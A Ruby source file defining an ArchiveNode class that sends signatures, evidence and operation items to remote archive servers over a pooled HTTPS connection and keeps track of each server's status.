require 'thread'
require 'rest-client'
require 'rcs-common/trace'
require 'persistent_http'
require_relative 'db_objects/status'
require_relative 'db_objects/signature'

module RCS
  module DB
    class ArchiveNode
      include RCS::Tracer
      extend RCS::Tracer

      attr_reader :address

      def initialize(address)
        @address = address
      end

      def signature
        Signature.where(scope: 'network').first.try(:value)
      end

      def status
        ::Status.where(address: address, type: 'archive').first
      end

      def setup!
        body = {signatures: ::Signature.all}
        request("/sync/setup", body) do |code, content|
          if code == 200
            update_status(status: ::Status::OK, info: 'Online')
          else
            update_status(status: ::Status::ERROR, info: content[:msg])
          end
        end
      end

      def ping!
        request("/sync/status") do |code, content|
          if code == 200
            update_status(content[:status])
          else
            update_status(status: ::Status::ERROR, info: content[:msg])
            setup! if content[:code] == 2 #NEED_SIGNATURES
          end
        end
      end

      def send_evidence(evidence, path)
        body = {evidence: evidence, path: path}

        request("/sync/evidence", body, on_error: :raise) do |code, content|
          if content[:code] == 4 #NEED_ITEMS
            send_items(content[:operation_id])
            send_evidence(evidence, path)
          end
        end
      end

      def send_items(operation_id)
        body = {items: ::Item.operation_items_sorted_by_kind(operation_id)}
        request("/sync/items", body, on_error: :raise)
      end

      def uri
        @uri ||= begin
          valid_address = address
          valid_address = "https://#{valid_address}" unless valid_address.start_with?('https')
          URI.parse(valid_address)
        end
      end

      def self.connections
        @@persistent_http ||= {}
      end

      def connection
        self.class.connections[address] ||= begin
          verify_mode = Config.instance.global['SSL_VERIFY'] ? OpenSSL::SSL::VERIFY_PEER : OpenSSL::SSL::VERIFY_NONE
          certificate_path = Config.instance.cert('rcs-db.crt')
          params = {
            name:         address,
            pool_size:    5,
            host:         uri.host,
            port:         uri.port,
            use_ssl:      true,
            ca_file:      certificate_path,
            cert:         OpenSSL::X509::Certificate.new(File.read(certificate_path)),
            verify_mode:  verify_mode,
            keep_alive:   50,
            open_timeout: 3,
            read_timeout: 3
          }

          PersistentHTTP.new(params)
        end
      end

      def request(path, body = {}, opts = {})
        trace :info, "Request #{path} on archive node #{address}"

        request = Net::HTTP::Post.new(path, 'x_sync_signature' => signature)
        request.body = body.respond_to?(:to_json) ? body.to_json : body
        resp = connection.request(request)

        code = resp.code.to_i
        content = JSON.parse(resp.body).symbolize_keys rescue {}

        trace :info, "Archive node #{address} respond #{code == 200 ? 'OK' : 'ERROR'} #{content[:msg].to_s}".strip

        if code != 200 and opts[:on_error] == :raise
          raise(content[:msg] || "Receive error #{code} from archive node #{address}")
        end

        yield(code, content) if block_given?
      rescue PersistentHTTP::Error => error
        trace :error, "Unable to reach archive node #{address}, #{error.message}"
        raise(error.message) if opts[:on_error] == :raise
        yield(-1, {msg: error.message}) if block_given?
      end

      def update_status(attributes)
        current = status.try(:attributes) || {}
        attributes = current.symbolize_keys.merge(attributes.symbolize_keys)
        stats = attributes.reject { |key| ![:disk, :cpu, :pcpu].include?(key) }
        params = ["RCS::DB (Archive)", address, attributes[:status], attributes[:info], stats, 'archive', attributes[:version]]

        ::Status.status_update(*params)
      end

      def destroy
        status.try(:destroy)
      end

      def self.all
        addresses = ::Connector.enabled.where(type: 'REMOTE').only(:dest).distinct(:dest)
        addresses.map! { |addr| new(addr) }
      end
    end
  end
end
